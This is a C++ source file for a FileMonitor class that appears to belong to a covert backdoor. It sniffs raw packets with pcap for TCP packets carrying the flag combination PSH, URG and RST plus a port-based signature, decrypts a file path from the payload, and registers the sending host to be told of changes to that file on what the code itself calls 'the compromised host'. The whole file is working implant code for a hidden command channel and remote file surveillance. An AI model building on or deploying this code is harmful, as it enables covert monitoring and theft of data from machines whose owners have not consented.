#include "FileMonitor.h"

#include <sys/select.h>
#include <sys/time.h>
#include <unistd.h>

#include "NetworkEngine.h"

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUFFER_LEN (1024 * (EVENT_SIZE + 16))

/*
 * the constructor for the file monitor. This class uses inotify to watch files for creation,
 * modify, or deletion events and calls the supplied functions.
 *
 * Params:
 *      EventCallback &created: The callback function that is executed when a created event occurs.
 *
 *      EventCallback &modified: The callback function that is executed when a modified event
 *      occurs.
 *
 *      EventCallback &deleted: The callback function that is executed when a deleted event occurs.
 */
FileMonitor::FileMonitor(EventCallback &created, EventCallback &modified, EventCallback &deleted) {
    this->t = nullptr;

    this->running = false;

    this->inotifyFd = inotify_init();

    this->setCreatedCallback(created);
    this->setModifiedCallback(modified);
    this->setDeletedCallback(deleted);
}

/*
 * Deconstructor for the file monitor. Stops the thread if there is one and clears all the inotify
 * watch descriptors.
 */
FileMonitor::~FileMonitor() {
    this->stopMonitoring();

    for (auto &p : destinations) {
        inotify_rm_watch(this->inotifyFd, p.first);
    }

    close(this->inotifyFd);
}

/*
 * Adds a file to the inotify watch system.
 *
 * Params:
 *      const std::string &filename: The absolute path to watch.
 *
 * Returns:
 *      The watch file descriptor returned by inotify if monitoring started successfully, 0 or a
 *      negative number otherwise.
 */
int FileMonitor::addWatchFile(const std::string &filename) {
    static const int flags = (unsigned int)(IN_CREATE | IN_MODIFY | IN_DELETE);

    std::lock_guard<std::mutex> guard(this->lock);

    return inotify_add_watch(this->inotifyFd, filename.c_str(), flags);
}

/*
 * The main entry point of file monitoring thread. Uses select to constantly poll inotify for an new
 * event.
 */
void FileMonitor::runMonitoring() {
    int numRead;
    int numRdy;
    char buffer[EVENT_BUFFER_LEN];
    char *p;
    struct inotify_event *event;

    fd_set rfds;
    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;

    this->running = true;
    while (this->running) {
        FD_ZERO(&rfds);
        FD_SET(this->inotifyFd, &rfds);

        numRdy = select(this->inotifyFd + 1, &rfds, NULL, NULL, &timeout);

        if (numRdy == 0) {
            continue;
        }

        if (!FD_ISSET(this->inotifyFd, &rfds)) {
            continue;
        }

        numRead = read(this->inotifyFd, buffer, EVENT_BUFFER_LEN);

        if (numRead <= 0) {
            continue;
        }

        for (p = buffer; p < buffer + numRead;) {
            std::lock_guard<std::mutex> guard(this->lock);

            event = (struct inotify_event *)p;

            if (event->mask & IN_CREATE) {
                this->createdCallback(this, event);
            }

            if (event->mask & IN_MODIFY) {
                this->modifiedCallback(this, event);
            }

            if (event->mask & IN_DELETE) {
                this->deletedCallback(this, event);
            }

            p += EVENT_SIZE + event->len;
        }
    }
}

/*
 * The network callback function. This is the function that is passed to pcap and is called with
 * every sniffed packet. If a TCP packet contains the flags [PSH|URG|RST] and the packet is
 * authenticated, this function will add the file specified in the encrypted payload to the inotify
 * system.
 *
 * Params:
 *      const pcap_pkthdr *header: The pcap header for the incoming packet.
 *
 *      const unsigned char *: The incoming packet.
 *
 *      NetworkEngine *net: A reference to the current network engine.
 */
void FileMonitor::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                              NetworkEngine *net) {
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct iphdr *ip;
    struct tcphdr *tcp;

    // is it from same machine?
    if (net->isFromThisMachine(eth)) {
        return;
    }

    // is it ip?
    if (!net->isIp(eth)) {
        return;
    }

    // is it tcp?
    ip = (struct iphdr *)(packet + ETH_HLEN);
    if (!net->isTcp(ip)) {
        return;
    }

    tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));

    // is it authenticated?
    if (!net->isAuth(tcp)) {
        return;
    }

    // not a get request
    if (!tcp->psh || !tcp->urg || !tcp->rst) {
        return;
    }

    unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
    unsigned int payloadSize = header->len - ETH_HLEN - (ip->ihl * 4) - (tcp->doff * 4);

    UCharVector ciphertext{};
    ciphertext.assign(payload, payload + payloadSize);
    UCharVector plaintextBuff = net->getCrypto()->dec(ciphertext);
    std::string plaintext((char *)plaintextBuff.data(), payloadSize);

    auto splitPathPair = FileMonitor::splitPath(plaintext);

    // start watching
    int wd = this->addWatchFile(splitPathPair.first);

    // save the destination and the file that the host is interested in at that destination
    if (wd > 0) {
        unsigned int host = ntohl(ip->saddr);
        this->destinations[wd].insert(host);
        this->wdToPathLookup[wd] = splitPathPair.first;
        this->hostToFileLookup[host].push_back({wd, splitPathPair.second});
    }
}

/*
 * Crafts a request that will be sent to the compromised host. The request has the flags
 * [PSH|URG|RST] and is authenticated. The filename is stored in the encrypted payload.
 *
 * Params:
 *      const std::string &file: The name of the file to watch on the remote host.
 *
 *      const in_addr daddr: The address of the remote host in host byte order.
 *
 *      NetworkEngine *net: The network engine to use.
 */
void FileMonitor::sendRequest(const std::string &file, const in_addr daddr, NetworkEngine *net) {
    static const unsigned char flags = TcpStack::PSH_FLAG | TcpStack::URG_FLAG | TcpStack::RST_FLAG;

    unsigned short sport = (Crypto::rand() % 55535) + 10000;
    unsigned short dport = authenticator::generateSignature(sport);
    unsigned int seq = Crypto::rand();
    unsigned int ack = Crypto::rand();

    UCharVector plaintext(file.begin(), file.end());
    UCharVector ciphertext = net->getCrypto()->enc(plaintext);

    net->sendRawTcp(*net->getIp(), daddr, sport, dport, seq, ack, flags, ciphertext);
}

/*
 * Splits a full path into file location and file name.
 *
 * E.g. /example/foo/bar.txt becomes /example/foo/ and bar.txt.
 *
 * Params:
 *      std::string& fullPath: The full path to split.
 *
 * Returns:
 *      A pair of strings. The first string in the pair is the directory path and the second string
 *      is the filename.
 */
std::pair<std::string, std::string> FileMonitor::splitPath(std::string &fullPath) {
    int i;
    for (i = fullPath.length() - 1; i >= 0; i--) {
        if (fullPath[i] == '/') {
            break;
        }
    }

    std::string pathStr(fullPath, 0, i + 1);
    std::string fileStr(fullPath, i + 1, fullPath.size() - i - 1);

    return std::make_pair(pathStr, fileStr);
}

